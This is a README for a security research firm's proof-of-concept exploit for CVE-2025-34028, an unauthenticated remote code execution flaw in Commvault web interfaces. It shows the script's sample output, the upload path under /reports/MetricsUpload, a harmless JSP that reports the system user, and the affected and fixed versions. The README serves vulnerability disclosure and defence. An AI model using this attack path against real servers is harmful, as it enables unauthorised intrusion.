
# CVE-2025-34028
A Commvault Pre-Authenticated Remote Code Execution Proof of Concept
 
See our [blog post](https://labs.watchtowr.com/) for technical details

# Detection in Action


```
 python watchtowr-vs-commvault-rce-CVE-2025-34028.py --url https://192.168.1.1
                         __         ___  ___________                   
         __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________ 
         \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
          \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
           \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|   
                                  \/          \/     \/                            
          
        watchtowr-vs-commvault-rce-CVE-2025-34028.py
        (*) Commvault Unauthenticated Remote Code Execution (CVE-2025-34028) POC by watchTowr
        
          - Sonny , watchTowr (sonny@watchTowr.com)

        CVEs: [CVE-2025-34028]
        
[*] Targeting https://192.168.1.1
[*] Verifying presence of Commvault
[*] Uploading to  /reports/MetricsUpload/2GfMIJdK/
[*] Fetching System User from  https://192.168.1.1/reports/MetricsUpload/2GfMIJdK/.tmp/dist-cc/dist-cc/shell.jsp
[*] System User EC2XXX-XXXXXXX$

```

# Description

This script is a proof of concept for CVE-2025-34028, for Commvault Web Interfaces. By uploading a zip file containing a code execution .jsp file, the zip file is uploaded to a public facing directory and the system user is detailed within the response. More details are described within our [blog post] (https://labs.watchtowr.com/).

# Note
The PoC script uses a hardcoded zip file containing the following files:
* /ccApp/index.html
* shell.jsp

Shell.jsp contents:

```
<%@ page import="java.util.*" %>
<html>
<body>
  <h3>System Information</h3>
  <p>Current User: <%= System.getProperty("user.name") %></p>
</body>
</html>
```

# Affected Versions

* Commvault Windows and Linux 11.38.0 - 11.38.19

# Remediated Versions

* Commvault Windows and Linux 11.38.20 as of April 10, 2025
* Commvault Windows and Linux 11.38.25 as of April 10, 2025

More details at [Commvault Advisory](https://documentation.commvault.com/securityadvisories/CV_2025_04_1.html)


# Follow [watchTowr](https://watchTowr.com) Labs

For the latest security research follow the [watchTowr](https://watchTowr.com) Labs Team 

- https://labs.watchtowr.com/
- https://x.com/watchtowrcyber
